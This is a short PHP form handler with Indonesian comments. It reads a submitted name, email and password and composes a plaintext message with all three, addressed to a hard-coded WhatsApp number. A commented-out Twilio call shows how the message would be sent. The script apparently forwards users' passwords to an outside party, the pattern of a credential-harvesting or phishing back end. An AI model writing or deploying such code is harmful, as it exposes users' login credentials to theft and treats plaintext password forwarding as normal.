<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nama = $_POST["nama"];
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Simpan data ke database (gunakan database sesuai kebutuhan Anda)

    // Kirim data ke WhatsApp
    $pesan = "Nama: $nama\nEmail: $email\nPassword: $password";
    $nomor_whatsapp = "62881036683241"; // Ganti dengan nomor WhatsApp penerima

    // Gunakan API WhatsApp atau library seperti Twilio untuk mengirim pesan ke WhatsApp
    // Contoh menggunakan Twilio
    // require 'vendor/autoload.php'; // Install Twilio PHP library melalui Composer

    // $sid = "your_twilio_sid";
    // $token = "your_twilio_token";
    // $twilio = new Twilio\Rest\Client($sid, $token);

    // $message = $twilio->messages
    //                   ->create("whatsapp:$nomor_whatsapp", // to
    //                             array("from" => "whatsapp:+14155238886", "body" => $pesan)
    //                   );

    // Jika menggunakan API WhatsApp lain, sesuaikan dengan dokumentasi API tersebut
}
?>
